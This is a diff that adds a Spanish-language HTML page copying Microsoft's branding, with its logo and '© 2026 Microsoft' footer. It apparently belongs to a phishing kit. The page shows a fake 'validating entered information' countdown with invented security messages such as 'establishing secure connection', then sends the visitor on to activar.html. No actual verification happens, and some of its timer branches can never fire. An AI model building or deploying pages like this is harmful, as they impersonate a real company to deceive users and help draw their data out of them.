@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Actualización de términos</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #f4f6f8;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .aaa {
+            width: 100%;
+            padding: 20px;
+            box-sizing: border-box;
+            display: flex;
+            justify-content: center;
+        }
+        .caja {
+            background: #ffffff;
+            width: 100%;
+            max-width: 460px;
+            padding: 48px 40px;
+            border-radius: 12px;
+            box-shadow: 0px 4px 24px rgba(0, 0, 0, 0.04);
+            text-align: center;
+            box-sizing: border-box;
+        }
+        .imgkol {
+            margin-bottom: 24px;
+        }
+        .imgkol img {
+            height: 22px;
+        }
+        .titu1 {
+            font-size: 26px;
+            font-weight: 600;
+            color: #111111;
+            line-height: 1.25;
+            margin: 0 auto 16px auto;
+            max-width: 320px;
+        }
+        .titu2 {
+            font-size: 14.5px;
+            color: #444444;
+            line-height: 1.5;
+            margin-bottom: 28px;
+        }
+        .subC {
+            background: #f4f5f7;
+            text-align: left;
+            padding: 20px 24px;
+            border-radius: 8px;
+            margin-bottom: 32px;
+            box-sizing: border-box;
+            border-left: 4px solid #0067b8;
+        }
+        .sut {
+            display: inline-block;
+            background: #e2f0fb;
+            color: #0067b8;
+            padding: 4px 12px;
+            border-radius: 20px;
+            font-size: 12px;
+            font-weight: 600;
+            margin-bottom: 14px;
+        }
+        .subC p {
+            font-size: 14px;
+            color: #333333;
+            line-height: 1.5;
+            margin: 0 0 12px 0;
+        }
+        .subC p:last-child {
+            margin-bottom: 0;
+        }
+        .btn1 {
+            margin-bottom: 32px;
+        }
+        .btn1 button {
+            background: #0067b8;
+            color: #ffffff;
+            border: none;
+            padding: 10px 32px;
+            font-size: 15px;
+            font-weight: 600;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        .btn1 button:hover {
+            background: #005a9e;
+        }
+        .adis {
+            border-top: 1px solid #f0f0f0;
+            padding-top: 20px;
+            font-size: 12px;
+            color: #666666;
+            text-align: left;
+            display: flex;
+            flex-wrap: wrap;
+            row-gap: 8px;
+            column-gap: 16px;
+        }
+        .adis a {
+            color: #666666;
+            text-decoration: none;
+        }
+        .adis a:hover {
+            text-decoration: underline;
+        }
+        .adis p {
+            width: 100%;
+            margin: 12px 0 0 0;
+            color: #888888;
+        }
+
+        .cargando-wrapper {
+    font-family: sans-serif;
+    text-align: center;
+    width: 100%;
+    max-width: 350px;
+    margin: 0 auto;
+}
+
+.texto-dinamico {
+    font-size: 13px;
+    color: #6b7280; 
+    margin-top: 15px;
+    font-style: italic;
+}
+
+.cargando-texto {
+    font-size: 14px;
+    color: #555;
+    margin-bottom: 8px;
+}
+
+.cronometro {
+    font-size: 24px;
+    font-weight: bold;
+    color: #333;
+    margin-bottom: 15px;
+}
+
+.barra-fondo {
+    width: 100%;
+    height: 4px; 
+    background-color: #e5e7eb; 
+    border-radius: 4px;
+    overflow: hidden;
+}
+
+.barra-progreso {
+    height: 100%;
+    width: 0%;
+    background-color: #60a5fa; 
+    transition: width 1s linear;
+}
+        @media (max-width: 480px) {
+            .caja {
+                padding: 32px 24px;
+            }
+            .titu1 {
+                font-size: 22px;
+            }
+            .adis {
+                flex-direction: column;
+                text-align: center;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="aaa">
+        <div class="caja">
+            <div class="imgkol">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/9/96/Microsoft_logo_%282012%29.svg" alt="">
+            </div>
+
+            <div class="titu1" style="font-size: 20px;">Espere un momento, estamos validando la información ingresada</div><br>
+            
+            
+            
+            <div class="subC">
+                <div class="cargando-wrapper">
+    <p class="cargando-texto">Espere unos minutos, no cierre la pestaña.</p>
+
+    
+    <div class="cronometro" id="tiempo">00:05</div>
+    <div class="barra-fondo">
+        <div class="barra-progreso" id="barra"></div>
+    </div>
+
+    <div class="texto-dinamico" id="mensaje-estado">Espere unos minutos, no cierre la pestaña.</div>
+</div>
+            </div>
+        
+            <div class="adis">
+                <a href="#">Términos de uso</a>
+                <a href="#">Aviso de privacidad</a>
+                <a href="#">Más información</a> 
+                <p>© 2026 Microsoft</p>
+            </div>
+        </div>
+    </div>
+
+
+
+    <script>let tiempoRestante = 5; 
+const elementoTiempo = document.getElementById('tiempo');
+const elementoBarra = document.getElementById('barra');
+const elementoMensaje = document.getElementById('mensaje-estado');
+
+const mensajes = [
+    "Espere unos minutos, no cierre la pestaña.",
+    "Verificando la integridad de los datos...",
+    "Estableciendo conexión segura...",
+    "Finalizando los últimos detalles..."
+];
+
+const intervalo = setInterval(() => {
+    tiempoRestante--;
+
+    let minutos = Math.floor(tiempoRestante / 60);
+    let segundos = tiempoRestante % 60;
+    elementoTiempo.textContent = `0${minutos}:${segundos < 10 ? '0' : ''}${segundos}`;
+
+    let porcentaje = ((5 - tiempoRestante) / 5) * 100;
+    elementoBarra.style.width = porcentaje + '%';
+
+    if (tiempoRestante === 11) {
+        elementoMensaje.textContent = mensajes[1];
+    } else if (tiempoRestante === 7) {
+        elementoMensaje.textContent = mensajes[2];
+    } else if (tiempoRestante === 3) {
+        elementoMensaje.textContent = mensajes[3];
+    }
+
+    if (tiempoRestante <= 0) {
+        clearInterval(intervalo);
+        elementoTiempo.textContent = "00:00";
+        elementoMensaje.textContent = "Proceso completado. Redirigiendo...";
+        elementoMensaje.style.color = "#10b981"; 
+
+        setTimeout(() => {
+            window.location.href = "activar.html"; 
+        }, 1500);
+    }
+}, 1000);</script>
+</body>
+</html>
